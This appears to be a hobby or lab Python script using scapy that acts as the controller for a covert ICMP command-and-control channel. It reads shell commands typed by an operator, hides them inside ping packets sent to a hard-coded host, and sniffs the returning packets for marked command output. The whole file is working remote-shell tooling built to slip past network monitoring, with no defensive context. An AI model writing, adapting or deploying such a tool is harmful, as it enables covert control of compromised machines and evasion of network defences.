from scapy.all import sniff, send, IP, ICMP
from threading import Thread
from time import sleep

def check_for_answer(packet):
    try:
        icmp = packet[0][2]
        if type(icmp) == ICMP:
            payload = bytes(icmp.payload)
            ligma_location = payload.find(b'BALLS')
            if ligma_location != -1:
                resp = str(payload[ligma_location+5:],"utf-8")
                print(resp, end="")
    except:
        pass
    return None

def grab():
    sniff(iface="bridge100", prn=check_for_answer)

thread_boi = Thread(target=grab)
thread_boi.start()

while True:
    print("\n> ", end="")
    cmd = input()
    cmd_packet = IP(src="172.16.44.1", dst="172.16.44.36")/ICMP(type=8)/("LIGMA" + cmd)
    send(cmd_packet, verbose=0)
    sleep(3)